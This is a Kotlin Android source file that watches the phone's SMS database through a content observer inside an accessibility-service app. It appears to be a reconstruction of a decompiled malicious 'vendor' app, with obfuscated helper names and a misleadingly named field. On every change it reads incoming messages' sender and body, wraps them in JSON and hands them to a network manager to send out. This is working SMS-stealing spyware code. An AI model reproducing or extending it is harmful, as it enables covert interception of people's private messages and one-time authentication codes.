package com.storm.safe.rock.service.modules

import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.storm.safe.rock.receiver.arniezsqllm
import com.storm.safe.rock.service.MyAccessibilityService
import org.json.JSONObject

/**
 * Monitor content://sms 数据库变化。对齐 vendor C0931ny（由 dqtvuisjd.m211506k2 注册）。
 *
 * vendor 行为：
 *   - 专用 HandlerThread "SmsObserver"
 *   - 前置 checkSelfPermission(READ_SMS) 权限检查
 *   - registerContentObserver(Uri.parse("content://sms"), notifyForDescendants=true, observer)
 *
 * Primary constructor: takes a generic onChanged lambda (Task 8 design).
 * Secondary constructor: takes MyAccessibilityService for backward compat with
 *   MyAccessibilityService.registerSmsContentObserver() (existing wiring).
 */
class SmsContentObserver(
    handler: Handler,
    private val onChanged: (selfChange: Boolean, uri: Uri?) -> Unit
) : ContentObserver(handler) {

    /**
     * Backward-compatible constructor used by MyAccessibilityService.registerSmsContentObserver().
     * Delegates to the primary constructor with an onChanged lambda that replicates the
     * original service-wired SMS query logic (original C0931ny flow).
     */
    constructor(handler: Handler, service: MyAccessibilityService) : this(
        handler,
        makeServiceCallback(service)
    )

    override fun onChange(selfChange: Boolean) {
        onChange(selfChange, null)
    }

    override fun onChange(selfChange: Boolean, uri: Uri?) {
        onChanged(selfChange, uri)
    }

    companion object {
        private const val TAG = "SmsContentObserver"
        const val HANDLER_THREAD_NAME: String = "SmsObserver"
        val SMS_URI: Uri? by lazy { Uri.parse("content://sms") }

        /**
         * Produces the onChanged lambda for the service-wired constructor.
         * Extracted as a top-level factory so that `return` (non-local) works correctly.
         */
        private fun makeServiceCallback(
            service: MyAccessibilityService
        ): (Boolean, Uri?) -> Unit = callback@{ _, _ ->
            val smsUri = SMS_URI ?: return@callback
            try {
                val lastSmsId = service.lastNetworkEventTime
                if (lastSmsId == 0L || lastSmsId == Long.MAX_VALUE) {
                    val cursor: Cursor? = service.contentResolver.query(
                        smsUri,
                        arrayOf("_id"),
                        null, null,
                        "_id DESC LIMIT 1"
                    )
                    if (cursor != null) {
                        if (cursor.moveToFirst()) {
                            val id = cursor.getLong(0)
                            service.lastNetworkEventTime = id
                            Log.d(TAG, "📩 [ContentObserver] 初始化 lastSmsId=$id")
                        }
                        cursor.close()
                    }
                    return@callback
                }

                val cursor: Cursor? = service.contentResolver.query(
                    smsUri,
                    arrayOf("_id", "address", "body", "date", "type"),
                    "_id > ? AND type = 1",
                    arrayOf(lastSmsId.toString()),
                    "_id ASC"
                )
                if (cursor != null) {
                    try {
                        while (cursor.moveToNext()) {
                            val id = cursor.getLong(0)
                            val address = cursor.getString(1) ?: ""
                            val body = cursor.getString(2) ?: ""
                            val date = cursor.getLong(3)

                            if (id > service.lastNetworkEventTime) {
                                service.lastNetworkEventTime = id
                            }

                            if (arniezsqllm.isDuplicateSms(address, body)) {
                                continue
                            }

                            Log.d(TAG, "📩 [ContentObserver] 新短信: $address, ${body.take(30)}...")

                            val nm = service.networkManager
                            if (nm != null) {
                                val data = JSONObject()
                                data.put("number", address)
                                data.put("text", body)
                                data.put("timestamp", date)
                                data.put("type", "incoming")
                                data.put("source", "content_observer")
                                nm.sendIncomingSms(data)
                            }
                        }
                    } finally {
                        cursor.close()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "📩 [ContentObserver] 检查新短信失败: ${e.message}", e)
            }
        }

        /**
         * 注册 observer。返回 (HandlerThread, SmsContentObserver) 用于后续 unregister + quitSafely。
         * 若 READ_SMS 未授权返回 null（对齐 vendor m211506k2 的权限检查分支）。
         */
        @JvmStatic
        fun register(
            context: Context,
            onChanged: (Boolean, Uri?) -> Unit
        ): Pair<HandlerThread, SmsContentObserver>? {
            if (context.checkSelfPermission(android.Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "READ_SMS 未授权，跳过 ContentObserver 注册")
                return null
            }
            val smsUri = SMS_URI ?: return null
            val thread = HandlerThread(HANDLER_THREAD_NAME).apply { start() }
            val handler = Handler(thread.looper)
            val observer = SmsContentObserver(handler, onChanged)
            context.contentResolver.registerContentObserver(smsUri, true, observer)
            Log.d(TAG, "ContentObserver 注册成功 on $smsUri")
            return Pair(thread, observer)
        }
    }
}
